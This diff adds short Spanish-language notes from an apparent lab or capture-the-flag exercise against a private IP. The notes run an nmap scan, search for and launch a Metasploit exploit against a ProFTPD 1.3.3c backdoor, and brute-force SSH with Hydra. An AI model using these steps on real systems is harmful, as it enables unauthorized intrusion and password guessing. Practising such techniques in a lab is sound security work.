@@ -1,0 +1,28 @@
+
+
+Escanear todos los puertos de una ip y mostrar version de la app
+>nmap -p- -sV 192.168.2.67
+
+Buscar vulnerabilidades en un aplicacion
+>searchmetasploit ProFTPD 1.3.3c
+
+
+Inicializar base de datos metasploit
+>msfdb init
+
+Iniciar metasploit 
+>msfconsole
+>search ProFTPD //Buscar la vulnerabilidad en base de datos para explotar
+>use 16   //16 es el nro de exploiy backdoor
+>show options
+>set RHOSTS 192.168.2.67
+>set RPORT 21
+>show payloads
+>set PAYLOAD 1
+>run
+
+Acceder  a protocolo
+Fuerza bruta con Hydra
+>hydra -l marlinspike -e nsr 192.168.2.67 ssh
+
+
